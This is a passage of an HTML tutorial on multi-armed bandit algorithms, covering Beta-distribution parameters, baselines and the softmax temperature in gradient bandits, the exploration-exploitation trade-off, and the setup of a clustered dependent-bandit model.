    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.1765em;vertical-align: -0.481108em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.695392em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right: 0.0037em">α</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right: 0.05278em">β</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right: 0.0037em">α</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.481108em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>, the closer the center of the probability density distribution is to 1, and the random numbers generated according to this probability distribution are said to be close to 1, and vice versa. In this case, arms with high means are more likely to be chosen</p> 
<p>(2) The larger the value <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        α
       
       
        +
       
       
        β
       
      
      
       alpha+beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.66666em;vertical-align: -0.08333em"></span><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span>, the narrower the distribution, that is, the higher the concentration and lower the variance, and the random numbers generated in this way are closer to the center position, which can also be seen from the variance formula. In this case, arms with high variance is more likely to be explored and updated.</p> 
<h4>
<a id="4circ_baseline_b_806"></a><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         4
        
        
         ∘
        
       
      
      
       4^circ
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.674115em;vertical-align: 0em"></span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.674115em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span> baseline <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        b
       
      
      
       b
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">b</span></span></span></span></span>
</h4> 
<p>The main purpose of introducing the baseline is to reduce the variance of algorithm and make the algorithm easier to converge. Because the introduction of the baseline makes the gap between the reward in different states smaller, that is, the global variance becomes smaller.</p> 
<p>We often regard <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         ^
        
       
       
        (
       
       
        t
       
       
        )
       
      
      
       hat{R}(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19677em;vertical-align: -0.25em"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.94677em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> as the baseline, which means that <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       R_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.00773em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span> being greater than <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         ^
        
       
       
        (
       
       
        t
       
       
        )
       
      
      
       hat{R}(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19677em;vertical-align: -0.25em"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.94677em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> corresponds to a lifting effectV(s) on <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       pi_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span> , <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       R_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.00773em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span> being less than <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         ^
        
       
       
        (
       
       
        t
       
       
        )
       
      
      
       hat{R}(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19677em;vertical-align: -0.25em"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.94677em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> corresponds to a reducing effect on <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       pi_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span>.</p> 
<h4>
<a id="5circ_beta_Gradient_812"></a><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         5
        
        
         ∘
        
       
      
      
       5^circ
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.674115em;vertical-align: 0em"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.674115em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span> <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> (Gradient)</h4> 
<p>The introduction of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> into the softmax function can make the gap of probability of different action <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       pi_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span> corresponding to the numerically limited preference function <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         H
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       H_t(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.08125em">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.08125em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span> larger, especially when the <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> is large.</p> 
<p>The introduction of the parameter <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> will make the action with a larger preference function to be selected more preferentially. A large value of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> will reduce the probability of exploration, and is more inclined to exploition. If <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
       
        →
       
       
        0
       
      
      
       beta to 0
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">0</span></span></span></span></span>, it will only explore. If <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
       
        →
       
       
        ∞
       
      
      
       beta to infty
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord">∞</span></span></span></span></span>, it will only exploit.</p> 
<h3>
<a id="III_Understanding_of_the_ExplorationExploiting_TradeOff_818"></a>III Understanding of the Exploration-Exploiting Trade-Off</h3> 
<p>Assume a case that when you plan to eat at a certain resturant, you can choose to eat the favourite dish you have known, and you can also try some new dishes which you have not eaten before. The former is the exploiting, and the latter is the exploration.</p> 
<p>In the bandit algorithms, the exploiting strategy means to draw the arm that seem best based on past outcomes, and the exploration strategy is to pick choices not yet tried out (or not tried enough).</p> 
<p>We need to explore because the given information is valuable. But we can do no exploration at all,focusing on the short-term returns. We need to occasionally explore at random: some short-term sacrifice may bring out more long-term reward, because you cannot make sure that the one we exploit is the global optimum, rather than the local optimum. So, we need to use the exploration strategy in this problem to find other possibilities. Otherwise, we may get stuck in a local optimum, and will be unable to find the global optimum.</p> 
<h3>
<a id="IV_Dependent_Case_825"></a>IV. Dependent Case</h3> 
<p>Formally, the dependent bandit problem is defined as follows. There is a slot machine with <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        N
       
      
      
       N
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span></span> arms that are grouped into <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        K
       
      
      
       K
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.07153em">K</span></span></span></span></span> known clusters. Each arm <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        i
       
      
      
       i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.65952em;vertical-align: 0em"></span><span class="mord mathdefault">i</span></span></span></span></span> has a fixed but unknown success probability <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         i
        
       
      
      
       θ_i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.84444em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span> . Let <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        [
       
       
        i
       
       
        ]
       
      
      
       [i]
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span></span> denote the cluster of arm <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        i
       
      
      
       i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.65952em;vertical-align: 0em"></span><span class="mord mathdefault">i</span></span></span></span></span>. Let <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         C
        
        
         
          [
         
         
          i
         
         
          ]
         
        
       
      
      
       C_{[i]}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.03853em;vertical-align: -0.3552em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3448em"><span class="" style="margin-left: -0.07153em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.3552em"><span class=""></span></span></span></span></span></span></span></span></span></span> be the set of all arms in cluster <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        [
       
       
        i
       
       
        ]
       
      
      
       [i]
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span></span> (including <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        i
       
      
      
       i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.65952em;vertical-align: 0em"></span><span class="mord mathdefault">i</span></span></span></span></span> itself), and let <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         C
        
        
         
          [
         
         
          i
         
         
          ]
         
        
        
         
          −
         
         
          i
         
        
       
       
        =
       
       
        
         C
        
        
         
          [
         
         
          i
         
         
          ]
         
         
          −
         
         
          i
         
        
       
      
      
       C_{[i]}^{-i} = C_{[i] - {i}}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.37999em;vertical-align: -0.5152em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.864795em"><span class="" style="margin-left: -0.07153em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span></span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.5152em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.03853em;vertical-align: -0.3552em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3448em"><span class="" style="margin-left: -0.07153em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.3552em"><span class=""></span></span></span></span></span></span></span></span></span></span>.</p> 
<p><img src="https://images2.imgbox.com/5f/b1/A1oJAaxe_o.png" alt="在这里插入图片描述"></p> 
<p>Firstly, we assume that the dependencies among arms in a cluster can be described by a generative model. The form of the generative model is known but its parameters are unknown. In particular, let <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         s
        
        
         i
        
       
       
        (
       
       
        t
       
       
        )
       
      
      
       s_i(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> be the number of times arm <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        i
       
      
      
       i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.65952em;vertical-align: 0em"></span><span class="mord mathdefault">i</span></span></span></span></span> generated a unit reward when pulled (“successes”), and <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         f
        
        
         i
        
       
       
        (
       
       
        t
       
       
        )
       
      
      
       f_i(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.10764em">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.10764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> the number of “failures.” Then, for each arm <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        i
       
      
      
       i
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.65952em;vertical-align: 0em"></span><span class="mord mathdefault">i</span></span></span></span></span> in cluster <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        [
       
       
        i
       
       
        ]
       
      
      
       [i]
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span></span>, we assume that</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         s
        
        
         i
        
       
       
        (
       
       
        t
       
       
        )
       
       
        ∣
       
       
        
         θ
        
        
         i
        
       
       
        ∼
       
       
        B
       
       
        e
       
       
        r
       
       
        n
       
       
        (
       
       
        
         θ
        
        
         i
        
       
       
        )
       
      
      
       s_i(t) | theta_i sim Bern(theta_i)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">∼</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.05017em">B</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span><br> <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         i
        
       
       
        ∼
       
       
        η
       
       
        (
       
       
        
         π
        
        
         
          [
         
         
          i
         
         
          ]
         
        
       
       
        )
       
      
      
       theta_i sim eta(pi_{[i]})
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.84444em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">∼</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.1052em;vertical-align: -0.3552em"></span><span class="mord mathdefault" style="margin-right: 0.03588em">η</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3448em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.3552em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p> 
<p>where <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        η
       
       
        (
       
       
        .
       
       
        )
       
      
      
       eta(.)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.03588em">η</span><span class="mopen">(</span><span class="mord">.</span><span class="mclose">)</span></span></span></span></span> is a probability distribution and <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         
          [
         
         
          i
         
         
          ]
         
        
       
      
      
       pi_{[i]}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.78576em;vertical-align: -0.3552em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3448em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.3552em"><span class=""></span></span></span></span></span></span></span></span></span></span> is the parameter set for cluster <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        [
       
       
        i
       
       
        ]
       
      
      
       [i]
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span></span>. Intuitively, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         C
        
       
      
      
       pi_C
      
     
